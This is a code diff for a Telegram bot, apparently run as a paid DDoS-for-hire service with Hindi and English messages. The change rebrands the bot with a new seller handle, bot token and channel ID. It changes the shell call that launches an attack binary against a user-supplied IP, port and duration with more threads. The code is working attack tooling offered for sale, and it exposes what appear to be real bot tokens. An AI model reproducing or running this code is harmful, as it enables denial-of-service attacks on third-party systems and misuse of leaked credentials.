@@ -6,8 +6,8 @@ from threading import Thread
 
 loop = asyncio.new_event_loop()
 
-TOKEN = "7758619230:AAEY6G0uIanl_Hpn0_YegCJI7DE8h-M44cs"
-FORWARD_CHANNEL_ID = -1002426268755
+TOKEN = "7780895680:AAEFgq0-Nc50dQCxtyHIUwwqDRnSmb8f3fc"
+FORWARD_CHANNEL_ID = -1001221863772
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -37,8 +37,8 @@ def handle_start(message):
         status = "अनुमति लंबित है" if user_id not in authorized_users else "अनुमति स्वीकृत"
 
         welcome_message = f"""
-*Welcome to APNA BHAI DDOS🚀  
-ANY INQUIRYS AND BUY_ @LASTWISHES0
+*Welcome to SHIVA BHAI DDOS🚀  
+ANY INQUIRYS AND BUY_ @SHIVAxHEADSHOT
 
 *आपकी जानकारी:*  
 👤 नाम: {full_name}  
@@ -135,7 +135,7 @@ def process_attack_command(message):
                                           f"समय: {duration} सेकंड!", parse_mode='Markdown')
         
         # New reply after attack launch with your updated message
-        bot.send_message(message.chat.id, "⚠️ If you do not provide feedback, you may be banned from the group. plz provide feedback. @LASTWISHES0")
+        bot.send_message(message.chat.id, "⚠️ If you do not provide feedback, you may be banned from the group. plz provide feedback. @SHIVAxHEADSHOT")
 
     except Exception as e:
         logging.error(f"Error processing attack command: {e}")
@@ -145,7 +145,7 @@ def process_attack_command(message):
 async def run_attack_command_async(target_ip, target_port, duration):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./Rahul {target_ip} {target_port} {duration} {900}",
+            f"./raja {target_ip} {target_port} {duration} {1200}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
         )
